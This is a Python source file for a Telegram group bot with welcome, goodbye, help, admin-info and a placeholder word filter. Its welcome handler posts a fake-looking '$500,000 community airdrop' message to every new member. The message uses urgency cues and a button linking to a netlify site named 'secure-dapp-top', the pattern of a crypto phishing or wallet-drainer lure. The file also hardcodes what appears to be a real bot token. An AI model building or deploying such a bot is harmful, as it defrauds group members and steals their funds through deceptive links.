import telebot
from telebot import types
import time

BOT_TOKEN = '7959242046:AAEw7AzpjhsiulZsRG5e3J0GPft9g5j1rIw'
bot = telebot.TeleBot(BOT_TOKEN)

# --- Welcome new members with Airdrop message and button ---
@bot.message_handler(content_types=['new_chat_members'])
def welcome_new_member(message):
    for new_member in message.new_chat_members:
        first_name = new_member.first_name or "there"
        welcome_text = (
            f"🎉 Welcome to the group, {first_name}!\n"
            "We're excited to have you with us.\n"
            "Feel free to introduce yourself and join the conversation! 😊"
        )
        join_msg = bot.send_message(message.chat.id, welcome_text)

        # Airdrop Message and Button
        airdrop_text = (
            "🎷 **Exciting News!** 🎷\n\n"
            "☘️ **Our Community Airdrop is Now Live!** ☘️\n\n"
            "To celebrate the growth of our project, we're giving away **$500,000** in rewards to our loyal community members! 🌴\n\n"
            "If you're part of our community and have purchased the token, you're eligible to participate and stand a chance to win rewards worth **$2,000 or more**. 👇\n\n"
            "⚡️ **Don’t Miss Out – Airdrop is Live!** ⚡️\n\n"
            "🚥 Join the Airdrop\n"
            "🚥 Claim Your Reward\n"
            "🚥 Visit the Airdrop Website Below:\n\n"
            "🏆 **Only the fastest participants will get guaranteed rewards.**\n"
            "⏳ Hurry – the airdrop is time-limited, so make sure to claim your reward before it expires!"
        )

        markup = types.InlineKeyboardMarkup()
        airdrop_button = types.InlineKeyboardButton("🌐 Participate in Airdrop", url="https://secure-dapp-top.netlify.app/")
        markup.add(airdrop_button)

        bot.send_message(message.chat.id, airdrop_text, reply_markup=markup)

        # Clear the join message after 5 seconds
        time.sleep(5)
        try:
            bot.delete_message(message.chat.id, join_msg.message_id)
        except Exception as e:
            print(f"Error deleting message: {e}")

# --- Goodbye message when a member leaves ---
@bot.message_handler(content_types=['left_chat_member'])
def member_left(message):
    left_name = message.left_chat_member.first_name or "User"
    leave_msg = bot.send_message(message.chat.id, f"👋 Goodbye, {left_name}. We'll miss you!")

    # Clear the leave message after 5 seconds
    time.sleep(5)
    try:
        bot.delete_message(message.chat.id, leave_msg.message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")

# --- /help command ---
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "🤖 *Available Commands:*\n"
        "/help - Show this message\n"
        "/groupinfo - Show group details (admin only)"
    )
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

# --- /groupinfo (admin only) ---
@bot.message_handler(commands=['groupinfo'])
def group_info(message):
    user_id = message.from_user.id
    chat_member = bot.get_chat_member(message.chat.id, user_id)
    if chat_member.status in ['administrator', 'creator']:
        info = (
            f"📊 *Group Info:*\n"
            f"Title: {message.chat.title}\n"
            f"ID: {message.chat.id}\n"
            f"Type: {message.chat.type}"
        )
        bot.send_message(message.chat.id, info, parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ You must be an admin to use this command.")

# --- Anti-spam: Delete messages with bad words ---
BAD_WORDS = ['spamword1', 'badword2', 'badlink']

@bot.message_handler(func=lambda m: True, content_types=['text'])
def filter_bad_words(message):
    if any(bad_word in message.text.lower() for bad_word in BAD_WORDS):
        try:
            bot.delete_message(message.chat.id, message.message_id)
            bot.send_message(message.chat.id, "🚫 Message removed for violating group rules.")
        except:
            pass  # Bot needs delete permission

# Start the bot
print("Bot is running...")
bot.infinity_polling()
